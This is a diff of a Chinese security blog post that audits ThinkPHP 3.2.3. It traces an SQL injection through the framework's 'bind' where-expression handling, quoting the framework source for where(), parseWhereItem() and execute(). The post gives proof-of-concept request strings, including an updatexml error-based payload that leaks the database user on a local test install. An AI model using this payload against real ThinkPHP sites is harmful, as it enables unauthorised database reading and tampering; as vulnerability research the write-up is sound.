@@ -8,18 +8,24 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>一次晕乎乎的tp审计 | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="MVCThinkPHP基于MVC（Model-View-Controller，模型-视图-控制器）模式，并且均支持多层（multi-Layer）设计。MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写M是指业务模型，V是指用户界面，C则是控制器使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表">
+  <meta name="description" content="tp3.2.3">
 <meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一次晕乎乎的tp审计">
-<meta property="og:url" content="http://yoursite.com/2020/04/29/一次晕乎乎的tp审计/index.html">
+<meta property="og:url" content="http://yoursite.com/2020/05/16/一次晕乎乎的tp审计/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="MVCThinkPHP基于MVC（Model-View-Controller，模型-视图-控制器）模式，并且均支持多层（multi-Layer）设计。MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写M是指业务模型，V是指用户界面，C则是控制器使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表">
+<meta property="og:description" content="tp3.2.3">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-06-04T11:30:52.031Z">
+<meta property="og:image" content="https://i.loli.net/2020/05/15/wNkd87EYanlmiHD.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/15/7RJlHcZwK9VXoOq.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/08/omQg3fljtVqTRJI.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/16/LvKACHwT1dcID8U.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/16/OxF7zayrBoJMQc9.png">
+<meta property="og:updated_time" content="2020-06-04T11:37:19.109Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一次晕乎乎的tp审计">
-<meta name="twitter:description" content="MVCThinkPHP基于MVC（Model-View-Controller，模型-视图-控制器）模式，并且均支持多层（multi-Layer）设计。MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写M是指业务模型，V是指用户界面，C则是控制器使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表">
+<meta name="twitter:description" content="tp3.2.3">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/15/wNkd87EYanlmiHD.png">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
   
@@ -188,8 +194,8 @@
   
 
         
-        <a href="/2020/04/29/一次晕乎乎的tp审计/" class="archive-article-date">
-  	<time datetime="2020-04-29T07:30:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
+        <a href="/2020/05/16/一次晕乎乎的tp审计/" class="archive-article-date">
+  	<time datetime="2020-05-16T07:30:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-16</time>
 </a>
     <!--字数统计-->
         
@@ -198,7 +204,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">2k字</span>
+        <span class="post-count">2.1k字</span>
       </span>
     </span>
 
@@ -207,7 +213,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
 </div>
@@ -218,7 +224,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h1><p>ThinkPHP基于MVC（Model-View-Controller，模型-视图-控制器）模式，并且均支持多层（multi-Layer）设计。<br>MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写M是指业务模型，V是指用户界面，C则是控制器使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。</p>
+        <p>tp3.2.3</p>
+<a id="more"></a>
+<h1 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h1><p>ThinkPHP基于MVC（Model-View-Controller，模型-视图-控制器）模式，并且均支持多层（multi-Layer）设计。<br>MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写M是指业务模型，V是指用户界面，C则是控制器使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。</p>
 <ul>
 <li><p>Model（模型）表示应用程序核心（比如数据库记录列表）。</p>
 </li>
@@ -271,33 +279,35 @@ W($name, $data=array(), $return=false,$path='')
 
 <p>在该方法下传入想修改的数据访问就可以修改。  </p>
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>首先index控制器里加数据库数据更新的方法（数组条件的where用法是ThinkPHP推荐的用法）：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public function changeIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        $User = M(&quot;Usr&quot;); // 实例化User对象</span><br><span class="line">        $user[&apos;id&apos;] = I(&apos;id&apos;);</span><br><span class="line">        $data[&apos;username&apos;] = I(&apos;username&apos;);</span><br><span class="line">        $data[&apos;email&apos;] = I(&apos;email&apos;);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">``` </span><br><span class="line">如果$id变量来自用户提交或者URL地址的话，如果传入的是非数字类型，则会强制格式化为数字格式后进行查询操作。（Moldel.class.php 680 _parseType()）  </span><br><span class="line"></span><br><span class="line">初始数据库是这样的：  </span><br><span class="line">![批注 2020-05-15 220437.png](https://i.loli.net/2020/05/15/wNkd87EYanlmiHD.png)  </span><br><span class="line">正常修改`?id=1&amp;email=123&amp;username=xxx`</span><br><span class="line">当传入的id为数组，并且第一个元素是bind时`?id[]=bind&amp;id[]=1&amp;email=123@qq.com&amp;username=xun93r`发现没有报错，但数据库的信息没有被成功修改。  </span><br><span class="line">可以看到sql语句变成：&quot;UPDATE `usr` SET `username`=:0,`email`=:1 WHERE `id` = :1&apos;  </span><br><span class="line">因为1变成了:1,最终sql语句为：   </span><br><span class="line"> `UPDATE `usr` SET `username`=&apos;xun93r&apos;,`email`=&apos;123@qq.com&apos; WHERE `id` = &apos;123@qq.com&apos;`  </span><br><span class="line">如果用`?id[]=bind&amp;id[]=1xun9er&amp;email=123@qq.com&amp;username=xun93r`</span><br><span class="line">![批注 2020-05-15 224930.png](https://i.loli.net/2020/05/15/7RJlHcZwK9VXoOq.png)  </span><br><span class="line">直接把后面的输入拼接了进去，skr注入点。</span><br><span class="line">当传入`http://localhost/thinkphp3/index.php/home/index/changeIndex?email[]=1123&amp;user=xun&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))`爆出用户：  </span><br><span class="line">![user.png](https://i.loli.net/2020/05/08/omQg3fljtVqTRJI.png)    </span><br><span class="line">## 过程：  </span><br><span class="line">`?email=1123@gmial.com&amp;user=xun&amp;password=pass&amp;id[0]=bind&amp;id[1]=1`</span><br><span class="line">实例化后where函数确定主键</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function changeIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        $User = M(&quot;Usr&quot;); // 实例化User对象</span><br><span class="line">        $user[&apos;id&apos;] = I(&apos;id&apos;);</span><br><span class="line">        $data[&apos;username&apos;] = I(&apos;username&apos;);</span><br><span class="line">        $data[&apos;email&apos;] = I(&apos;email&apos;);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>public function where($where,$parse=null){<br>        if(!is_null($parse) &amp;&amp; is_string($where)) {<br>            if(!is_array($parse)) {<br>                $parse = func_get_args();<br>                array_shift($parse);<br>            }<br>            $parse = array_map(array($this-&gt;db,’escapeString’),$parse);<br>            $where =   vsprintf($where,$parse);<br>        }elseif(is_object($where)){<br>            $where  =   get_object_vars($where);<br>        }<br>        if(is_string($where) &amp;&amp; ‘’ != $where){<br>            $map    =   array();<br>            $map[‘_string’]   =   $where;<br>            $where  =   $map;<br>        }<br>        if(isset($this-&gt;options[‘where’])){<br>            $this-&gt;options[‘where’] =   array_merge($this-&gt;options[‘where’],$where);<br>        }else{<br>            $this-&gt;options[‘where’] =   $where;<br>        }</p>
-<pre><code>    return $this;
-}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Model.class.php 627  _parseOption函数：  </span><br><span class="line">因为传入的id是一个数组不是标量，绕过了_parseOptions函数里对id参数的强制类型转换：</span><br></pre></td></tr></table></figure>
+<p>如果$id变量来自用户提交或者URL地址的话，如果传入的是非数字类型，则会强制格式化为数字格式后进行查询操作。（Moldel.class.php 680 _parseType()）  </p>
+<p>初始数据库是这样的：<br><img src="https://i.loli.net/2020/05/15/wNkd87EYanlmiHD.png" alt="批注 2020-05-15 220437.png"><br>正常修改<code>?id=1&amp;email=123&amp;username=xxx</code><br>当传入的id为数组，并且第一个元素是bind时<code>?id[]=bind&amp;id[]=1&amp;email=123@qq.com&amp;username=xun93r</code>发现没有报错，但数据库的信息没有被成功修改。<br>可以看到sql语句变成：”UPDATE <code>usr</code> SET <code>username</code>=:0,<code>email</code>=:1 WHERE <code>id</code> = :1’<br>因为1变成了:1,最终sql语句为：<br> <code>UPDATE</code>usr<code>SET</code>username<code>=&#39;xun93r&#39;,</code>email<code>=&#39;123@qq.com&#39; WHERE</code>id<code>= &#39;123@qq.com&#39;</code><br>如果用<code>?id[]=bind&amp;id[]=1xun9er&amp;email=123@qq.com&amp;username=xun93r</code><br><img src="https://i.loli.net/2020/05/15/7RJlHcZwK9VXoOq.png" alt="批注 2020-05-15 224930.png"><br>直接把后面的输入拼接了进去，skr注入点。<br>当传入<code>http://localhost/thinkphp3/index.php/home/index/changeIndex?email[]=1123&amp;user=xun&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code>爆出用户：<br><img src="https://i.loli.net/2020/05/08/omQg3fljtVqTRJI.png" alt="user.png">    </p>
+<h2 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h2><p><code>?email=1123@gmial.com&amp;user=xun&amp;password=pass&amp;id[0]=bind&amp;id[1]=1</code><br>实例化后where函数确定主键  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public function where($where,$parse=null)&#123;</span><br><span class="line">        if(!is_null($parse) &amp;&amp; is_string($where)) &#123;</span><br><span class="line">            if(!is_array($parse)) &#123;</span><br><span class="line">                $parse = func_get_args();</span><br><span class="line">                array_shift($parse);</span><br><span class="line">            &#125;</span><br><span class="line">            $parse = array_map(array($this-&gt;db,&apos;escapeString&apos;),$parse);</span><br><span class="line">            $where =   vsprintf($where,$parse);</span><br><span class="line">        &#125;elseif(is_object($where))&#123;</span><br><span class="line">            $where  =   get_object_vars($where);</span><br><span class="line">        &#125;</span><br><span class="line">        if(is_string($where) &amp;&amp; &apos;&apos; != $where)&#123;</span><br><span class="line">            $map    =   array();</span><br><span class="line">            $map[&apos;_string&apos;]   =   $where;</span><br><span class="line">            $where  =   $map;</span><br><span class="line">        &#125;        </span><br><span class="line">        if(isset($this-&gt;options[&apos;where&apos;]))&#123;</span><br><span class="line">            $this-&gt;options[&apos;where&apos;] =   array_merge($this-&gt;options[&apos;where&apos;],$where);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;options[&apos;where&apos;] =   $where;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>if(is_scalar($val)) {<br>                        $this-&gt;_parseType($options[‘where’],$key);<br>                    }</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">就不会有对id参数类型的强制转换。  </span><br><span class="line">然后save把接收传入的内容进行处理为并更新到数据库。  </span><br><span class="line"></span><br><span class="line">在drive.class.php 547 parseWhereItem  </span><br><span class="line">此时:  </span><br><span class="line">&lt;pr&gt;</span><br><span class="line">$var=array(2)</span><br><span class="line">0:&quot;bind&quot;</span><br><span class="line">1:&quot;1&quot;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">![批注 2020-05-16 115207.png](https://i.loli.net/2020/05/16/LvKACHwT1dcID8U.png)  </span><br><span class="line">在这里（问题重心）</span><br></pre></td></tr></table></figure>
+<p>在Model.class.php 627  _parseOption函数：<br>因为传入的id是一个数组不是标量，绕过了_parseOptions函数里对id参数的强制类型转换： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(is_scalar($val)) &#123;</span><br><span class="line">                        $this-&gt;_parseType($options[&apos;where&apos;],$key);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>elseif(‘bind’ == $exp ){ // 使用表达式<br>                    $whereStr .= $key.’ = :’.$val[1];</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接把id传入得第二个参数拼接了进去。  </span><br><span class="line">得到：  </span><br><span class="line">![批注 2020-05-16 115408.png](https://i.loli.net/2020/05/16/OxF7zayrBoJMQc9.png)</span><br></pre></td></tr></table></figure>
+<p>就不会有对id参数类型的强制转换。<br>然后save把接收传入的内容进行处理为并更新到数据库。  </p>
+<p>在drive.class.php 547 parseWhereItem<br>此时:<br><pr><br>$var=array(2)<br>0:”bind”<br>1:”1”<br><br><img src="https://i.loli.net/2020/05/16/LvKACHwT1dcID8U.png" alt="批注 2020-05-16 115207.png"><br>在这里（问题重心）    </pr></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elseif(&apos;bind&apos; == $exp )&#123; // 使用表达式</span><br><span class="line">                    $whereStr .= $key.&apos; = :&apos;.$val[1];</span><br></pre></td></tr></table></figure>
 
-<p>protected function parseWhereItem($key,$val) {<br>        $whereStr = ‘’;<br>        if(is_array($val)) {<br>            if(is_string($val[0])) {<br>                $exp    =    strtolower($val[0]);<br>                if(preg_match(‘/^(eq|neq|gt|egt|lt|elt)$/‘,$exp)) { // 比较运算<br>                    $whereStr .= $key.’ ‘.$this-&gt;exp[$exp].’ ‘.$this-&gt;parseValue($val[1]);<br>                }elseif(preg_match(‘/^(notlike|like)$/‘,$exp)){// 模糊查找<br>                    if(is_array($val[1])) {<br>                        $likeLogic  =   isset($val[2])?strtoupper($val[2]):’OR’;<br>                        if(in_array($likeLogic,array(‘AND’,’OR’,’XOR’))){<br>                            $like       =   array();<br>                            foreach ($val[1] as $item){<br>                                $like[] = $key.’ ‘.$this-&gt;exp[$exp].’ ‘.$this-&gt;parseValue($item);<br>                            }<br>                            $whereStr .= ‘(‘.implode(‘ ‘.$likeLogic.’ ‘,$like).’)’;<br>                        }<br>                    }else{<br>                        $whereStr .= $key.’ ‘.$this-&gt;exp[$exp].’ ‘.$this-&gt;parseValue($val[1]);<br>                    }<br>                }elseif(‘bind’ == $exp ){ // 使用表达式<br>                    $whereStr .= $key.’ = :’.$val[1];<br>                }elseif(‘exp’ == $exp ){ // 使用表达式<br>                    $whereStr .= $key.’ ‘.$val[1];<br>                }elseif(preg_match(‘/^(notin|not in|in)$/‘,$exp)){ // IN 运算<br>                    if(isset($val[2]) &amp;&amp; ‘exp’==$val[2]) {<br>                        $whereStr .= $key.’ ‘.$this-&gt;exp[$exp].’ ‘.$val[1];<br>                    }else{<br>                        if(is_string($val[1])) {<br>                             $val[1] =  explode(‘,’,$val[1]);<br>                        }<br>                        $zone      =   implode(‘,’,$this-&gt;parseValue($val[1]));<br>                        $whereStr .= $key.’ ‘.$this-&gt;exp[$exp].’ (‘.$zone.’)’;<br>                    }<br>                }elseif(preg_match(‘/^(notbetween|not between|between)$/‘,$exp)){ // BETWEEN运算<br>                    $data = is_string($val[1])? explode(‘,’,$val[1]):$val[1];<br>                    $whereStr .=  $key.’ ‘.$this-&gt;exp[$exp].’ ‘.$this-&gt;parseValue($data[0]).’ AND ‘.$this-&gt;parseValue($data[1]);<br>                }else{<br>                    E(L(‘<em>EXPRESS_ERROR</em>‘).’:’.$val[0]);<br>                }<br>            }else {<br>                $count = count($val);<br>                $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : ‘’ ;<br>                if(in_array($rule,array(‘AND’,’OR’,’XOR’))) {<br>                    $count  = $count -1;<br>                }else{<br>                    $rule   = ‘AND’;<br>                }<br>                for($i=0;$i&lt;$count;$i++) {<br>                    $data = is_array($val[$i])?$val[$i][1]:$val[$i];<br>                    if(‘exp’==strtolower($val[$i][0])) {<br>                        $whereStr .= $key.’ ‘.$data.’ ‘.$rule.’ ‘;<br>                    }else{<br>                        $whereStr .= $this-&gt;parseWhereItem($key,$val[$i]).’ ‘.$rule.’ ‘;<br>                    }<br>                }<br>                $whereStr = ‘( ‘.substr($whereStr,0,-4).’ )’;<br>            }<br>        }else {<br>            //对字符串类型字段采用模糊匹配<br>            $likeFields   =   $this-&gt;config[‘db_like_fields’];<br>            if($likeFields &amp;&amp; preg_match(‘/^(‘.$likeFields.’)$/i’,$key)) {<br>                $whereStr .= $key.’ LIKE ‘.$this-&gt;parseValue(‘%’.$val.’%’);<br>            }else {<br>                $whereStr .= $key.’ = ‘.$this-&gt;parseValue($val);<br>            }<br>        }<br>        return $whereStr;<br>    }</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在drive.class.php 192 execute函数中$this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that)&#123; return &apos;\&apos;&apos;.$that-&gt;escapeString($val).&apos;\&apos;&apos;; &#125;,$this-&gt;bind)); 匿名函数得形势用strtr对:0/:1进行替换。</span><br></pre></td></tr></table></figure>
+<p>直接把id传入得第二个参数拼接了进去。<br>得到：<br><img src="https://i.loli.net/2020/05/16/OxF7zayrBoJMQc9.png" alt="批注 2020-05-16 115408.png">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">protected function parseWhereItem($key,$val) &#123;</span><br><span class="line">        $whereStr = &apos;&apos;;</span><br><span class="line">        if(is_array($val)) &#123;</span><br><span class="line">            if(is_string($val[0])) &#123;</span><br><span class="line">				$exp	=	strtolower($val[0]);</span><br><span class="line">                if(preg_match(&apos;/^(eq|neq|gt|egt|lt|elt)$/&apos;,$exp)) &#123; // 比较运算</span><br><span class="line">                    $whereStr .= $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; &apos;.$this-&gt;parseValue($val[1]);</span><br><span class="line">                &#125;elseif(preg_match(&apos;/^(notlike|like)$/&apos;,$exp))&#123;// 模糊查找</span><br><span class="line">                    if(is_array($val[1])) &#123;</span><br><span class="line">                        $likeLogic  =   isset($val[2])?strtoupper($val[2]):&apos;OR&apos;;</span><br><span class="line">                        if(in_array($likeLogic,array(&apos;AND&apos;,&apos;OR&apos;,&apos;XOR&apos;)))&#123;</span><br><span class="line">                            $like       =   array();</span><br><span class="line">                            foreach ($val[1] as $item)&#123;</span><br><span class="line">                                $like[] = $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; &apos;.$this-&gt;parseValue($item);</span><br><span class="line">                            &#125;</span><br><span class="line">                            $whereStr .= &apos;(&apos;.implode(&apos; &apos;.$likeLogic.&apos; &apos;,$like).&apos;)&apos;;                          </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        $whereStr .= $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; &apos;.$this-&gt;parseValue($val[1]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;elseif(&apos;bind&apos; == $exp )&#123; // 使用表达式</span><br><span class="line">                    $whereStr .= $key.&apos; = :&apos;.$val[1];</span><br><span class="line">                &#125;elseif(&apos;exp&apos; == $exp )&#123; // 使用表达式</span><br><span class="line">                    $whereStr .= $key.&apos; &apos;.$val[1];</span><br><span class="line">                &#125;elseif(preg_match(&apos;/^(notin|not in|in)$/&apos;,$exp))&#123; // IN 运算</span><br><span class="line">                    if(isset($val[2]) &amp;&amp; &apos;exp&apos;==$val[2]) &#123;</span><br><span class="line">                        $whereStr .= $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; &apos;.$val[1];</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        if(is_string($val[1])) &#123;</span><br><span class="line">                             $val[1] =  explode(&apos;,&apos;,$val[1]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        $zone      =   implode(&apos;,&apos;,$this-&gt;parseValue($val[1]));</span><br><span class="line">                        $whereStr .= $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; (&apos;.$zone.&apos;)&apos;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;elseif(preg_match(&apos;/^(notbetween|not between|between)$/&apos;,$exp))&#123; // BETWEEN运算</span><br><span class="line">                    $data = is_string($val[1])? explode(&apos;,&apos;,$val[1]):$val[1];</span><br><span class="line">                    $whereStr .=  $key.&apos; &apos;.$this-&gt;exp[$exp].&apos; &apos;.$this-&gt;parseValue($data[0]).&apos; AND &apos;.$this-&gt;parseValue($data[1]);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    E(L(&apos;_EXPRESS_ERROR_&apos;).&apos;:&apos;.$val[0]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                $count = count($val);</span><br><span class="line">                $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : &apos;&apos; ; </span><br><span class="line">                if(in_array($rule,array(&apos;AND&apos;,&apos;OR&apos;,&apos;XOR&apos;))) &#123;</span><br><span class="line">                    $count  = $count -1;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $rule   = &apos;AND&apos;;</span><br><span class="line">                &#125;</span><br><span class="line">                for($i=0;$i&lt;$count;$i++) &#123;</span><br><span class="line">                    $data = is_array($val[$i])?$val[$i][1]:$val[$i];</span><br><span class="line">                    if(&apos;exp&apos;==strtolower($val[$i][0])) &#123;</span><br><span class="line">                        $whereStr .= $key.&apos; &apos;.$data.&apos; &apos;.$rule.&apos; &apos;;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        $whereStr .= $this-&gt;parseWhereItem($key,$val[$i]).&apos; &apos;.$rule.&apos; &apos;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $whereStr = &apos;( &apos;.substr($whereStr,0,-4).&apos; )&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            //对字符串类型字段采用模糊匹配</span><br><span class="line">            $likeFields   =   $this-&gt;config[&apos;db_like_fields&apos;];</span><br><span class="line">            if($likeFields &amp;&amp; preg_match(&apos;/^(&apos;.$likeFields.&apos;)$/i&apos;,$key)) &#123;</span><br><span class="line">                $whereStr .= $key.&apos; LIKE &apos;.$this-&gt;parseValue(&apos;%&apos;.$val.&apos;%&apos;);</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                $whereStr .= $key.&apos; = &apos;.$this-&gt;parseValue($val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $whereStr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p>public function execute($str,$fetchSql=false) {<br>        $this-&gt;initConnect(true);<br>        if ( !$this-&gt;_linkID ) return false;<br>        $this-&gt;queryStr = $str;<br>        if(!empty($this-&gt;bind)){<br>            $that   =   $this;<br>            $this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that){ return ‘&#39;‘.$that-&gt;escapeString($val).’&#39;‘; },$this-&gt;bind));<br>        }<br>        if($fetchSql){<br>            return $this-&gt;queryStr;<br>        }<br>        //释放前次的查询结果<br>        if ( !empty($this-&gt;PDOStatement) ) $this-&gt;free();<br>        $this-&gt;executeTimes++;<br>        N(‘db_write’,1); // 兼容代码<br>        // 记录开始执行时间<br>        $this-&gt;debug(true);<br>        $this-&gt;PDOStatement =   $this-&gt;_linkID-&gt;prepare($str);<br>        if(false === $this-&gt;PDOStatement) {<br>            $this-&gt;error();<br>            return false;<br>        }<br>        foreach ($this-&gt;bind as $key =&gt; $val) {<br>            if(is_array($val)){<br>                $this-&gt;PDOStatement-&gt;bindValue($key, $val[0], $val[1]);<br>            }else{<br>                $this-&gt;PDOStatement-&gt;bindValue($key, $val);<br>            }<br>        }<br>        $this-&gt;bind =   array();<br>        try{<br>            $result =   $this-&gt;PDOStatement-&gt;execute();<br>            // 调试结束<br>            $this-&gt;debug(false);<br>            if ( false === $result) {<br>                $this-&gt;error();<br>                return false;<br>            } else {<br>                $this-&gt;numRows = $this-&gt;PDOStatement-&gt;rowCount();<br>                if(preg_match(“/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i”, $str)) {<br>                    $this-&gt;lastInsID = $this-&gt;_linkID-&gt;lastInsertId();<br>                }<br>                return $this-&gt;numRows;<br>            }<br>        }catch (\PDOException $e) {<br>            $this-&gt;error();<br>            return false;<br>        }<br>    }</p>
-<pre><code>
-
-
-
-
+<p>在drive.class.php 192 execute函数中$this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that){ return ‘&#39;‘.$that-&gt;escapeString($val).’&#39;‘; },$this-&gt;bind)); 匿名函数得形势用strtr对:0/:1进行替换。  </p>
